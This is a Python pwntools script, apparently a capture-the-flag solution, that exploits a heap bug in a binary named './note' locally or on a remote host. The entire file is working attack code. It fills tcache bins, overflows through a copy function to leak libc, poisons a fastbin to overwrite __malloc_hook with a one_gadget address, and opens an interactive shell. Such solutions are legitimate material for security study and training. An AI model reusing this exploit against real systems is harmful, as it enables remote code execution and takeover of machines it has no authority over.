from pwn import *
import sys
if len(sys.argv) >1:
    r = remote(sys.argv[1], int(sys.argv[2]))
else:
    r = process('./note')

def create(size):
    r.sendlineafter(':', '1')
    r.sendlineafter(':', str(size))

def edit(idx, ctx):
    r.sendlineafter(':', '2')
    r.sendlineafter(':', str(idx))
    r.sendafter(':', ctx)

def show(idx):
    r.sendlineafter(':', '3')
    r.sendlineafter(':', str(idx))

def copy(src,dst):
    r.sendlineafter(':', '4')
    r.sendlineafter(':', str(src))
    r.sendlineafter(':', str(dst))

def delete(idx):
    r.sendlineafter(':', '5')
    r.sendlineafter(':', str(idx))

for i in range(7):
    create(0x60)
    delete(0)

for i in range(7):
    create(0x400)
    delete(0)

create(0x80)
create(0x400)
create(0x80)
create(0x400)
create(0x80)
create(0x60)
create(0x60)
create(0x80)
delete(1)

edit(3, 'A'*0x100 + '\n')
copy(3, 0)
show(0)

r.recvn(0x91)
libc = u64(r.recvn(8)) - 0x3ebca0
print('libc', hex(libc))

delete(6)
delete(5)

copy(3, 4)
edit(3, 'A'*0x90 + p64(libc+0x3ebc30-0x28+5))
copy(3, 4)

for i in range(6,-1, -1):
    edit(3, 'A'*(0x88+i) + p64(0x71) )
    copy(3, 4)
create(0x60)
create(0x60)

one_gadget = libc+0x4f322
edit(5, 'A'*0x13 + p64(one_gadget))
delete(0)
create(0)

r.interactive()
